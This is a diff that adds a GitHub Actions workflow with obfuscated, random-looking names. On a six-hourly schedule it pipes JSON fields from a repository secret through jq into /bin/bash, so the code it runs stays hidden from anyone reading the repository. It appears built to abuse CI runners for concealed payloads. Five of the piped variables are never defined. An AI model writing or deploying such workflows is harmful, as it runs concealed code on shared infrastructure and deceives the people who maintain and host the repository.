@@ -1,0 +1,22 @@
+name: zhangshuying7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangshuying7654
+        env:
+          uldyi368: ${{ secrets.uldyi368 }}
+        run: |
+          echo $uldyi368 | jq -r .engl9 | /bin/bash
+          echo $mqs70 | jq -r .d4533 | /bin/bash
+          echo $a97 | jq -r .vcopu9 | /bin/bash
+          echo $fl7541 | jq -r .srk763 | /bin/bash
+          echo $jfeu30943 | jq -r .ba0 | /bin/bash
+          echo $eya0 | jq -r .tj4992 | /bin/bash
+
